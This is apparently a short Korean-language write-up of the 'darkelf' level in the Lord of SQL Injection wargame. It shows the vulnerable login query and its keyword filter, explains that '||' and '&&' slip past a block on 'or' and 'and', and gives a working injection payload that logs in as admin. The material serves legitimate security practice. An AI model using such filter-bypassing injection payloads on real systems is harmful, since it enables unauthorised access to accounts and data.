---
title: "[LOS] darkelf"
date: 2025-03-26 00:00:00
categories: [Wargame, Lord of SQL Injection]
tags: [webhacking, sqli]
published: True
---

# Query

```sql
select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'
```

<br>

# Protection

## preg_match

- `prob` 문자열
- `_`
- `.`
- `()`
- `or`
- `and`

<br>


# Analysis

- `and`와 `or` 연산자 대신 `&&`, `||`를 사용할 수 있다

<br>

# Payload

```
?pw=' || id='admin' %23
```
